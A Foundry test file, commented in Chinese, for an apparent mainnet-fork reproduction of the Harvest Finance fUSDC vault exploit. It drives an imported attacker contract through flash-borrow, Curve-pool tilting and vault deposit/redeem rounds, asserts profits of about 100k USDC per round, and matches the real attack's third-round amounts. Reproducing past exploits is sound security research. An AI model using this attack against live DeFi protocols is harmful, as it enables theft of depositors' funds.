// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;

import "./ForkBase.sol";
import {Mainnet} from "../src/Addresses.sol";
import {HarvestAttacker} from "../src/HarvestAttacker.sol";
import {IHarvestVaultLike} from "../src/interfaces/IHarvestVaultLike.sol";
import {IERC20Like} from "../src/interfaces/IERC20Like.sol";

/// @title 测试 4：完整单轮攻击（也是本次复现的主用例）
/// @dev 断言不写死利润金额，只断言方向与量级，避免 fork 深度/节点差异导致误报
contract FullAttackTest is ForkBase {
    HarvestAttacker internal attacker;

    function setUp() public {
        _fork();
        if (forked) attacker = new HarvestAttacker();
    }

    function _cfg() internal pure returns (HarvestAttacker.Cfg memory c) {
        c = HarvestAttacker.Cfg({
            vault: Mainnet.FUSDC,
            want: Mainnet.USDC,
            tilt: Mainnet.USDT,
            pairWant: Mainnet.UNI_USDC_WETH,
            pairTilt: Mainnet.UNI_USDT_WETH,
            curvePool: Mainnet.YPOOL,
            idxWant: 1,
            idxTilt: 2
        });
    }

    function test_SingleRoundAttackProfitable() public {
        if (!forked) return;

        HarvestAttacker.Params memory p = HarvestAttacker.Params({
            borrowTilt: Mainnet.BORROW_USDT,
            tiltAmount: Mainnet.TILT_USDT,
            borrowWant: Mainnet.BORROW_USDC,
            depositAmount: Mainnet.DEPOSIT_USDC,
            rounds: 1
        });

        HarvestAttacker.Report memory rep = attacker.attack(_cfg(), p);

        emit log_named_decimal_uint("profit USDC", rep.profit, 6);
        emit log_named_decimal_uint("shares", rep.shares, 6);
        emit log_named_decimal_uint("deposited", rep.deposited, 6);
        emit log_named_decimal_uint("redeemed", rep.redeemed, 6);

        assertGt(rep.profit, 0, "must profit");
        assertEq(IHarvestVaultLike(Mainnet.FUSDC).balanceOf(address(attacker)), 0, "shares burned to zero");
        assertEq(IERC20Like(Mainnet.USDT).balanceOf(address(attacker)), 0, "no USDT left");
        // 实测：单轮约 101,784 USDC；给 20% 容差
        assertGt(rep.profit, 80_000e6, "profit magnitude");
        assertLt(rep.profit, 130_000e6, "profit magnitude");
    }

    function test_ThreeRoundsMatchRealTransaction() public {
        if (!forked) return;

        HarvestAttacker.Params memory p = HarvestAttacker.Params({
            borrowTilt: Mainnet.BORROW_USDT,
            tiltAmount: Mainnet.TILT_USDT,
            borrowWant: Mainnet.BORROW_USDC,
            depositAmount: Mainnet.DEPOSIT_USDC,
            rounds: 3
        });

        HarvestAttacker.Report memory rep = attacker.attack(_cfg(), p);
        emit log_named_decimal_uint("3-round profit USDC", rep.profit, 6);
        emit log_named_decimal_uint("round-3 shares", rep.shares, 6);
        emit log_named_decimal_uint("round-3 deposited", rep.deposited, 6);
        emit log_named_decimal_uint("round-3 redeemed", rep.redeemed, 6);

        // 链上真实交易第三轮：存入 50,574,381.356760，赎回 50,894,567.817318
        assertApproxEqRel(rep.deposited, 50_574_381.356760e6, 0.0001e18, "round-3 deposit must match on-chain value");
        assertApproxEqRel(rep.redeemed, 50_894_567.817318e6, 0.0001e18, "round-3 redeem must match on-chain value");
        assertGt(rep.profit, 600_000e6, "3-round compounded profit magnitude");
    }

    function test_RevertsWhenDepositExceedsBalance() public {
        if (!forked) return;
        HarvestAttacker.Params memory p = HarvestAttacker.Params({
            borrowTilt: Mainnet.BORROW_USDT,
            tiltAmount: Mainnet.TILT_USDT,
            borrowWant: Mainnet.BORROW_USDC,
            depositAmount: 200_000_000e6, // 明显超过可用余额
            rounds: 1
        });
        vm.expectRevert();
        attacker.attack(_cfg(), p);
    }
}
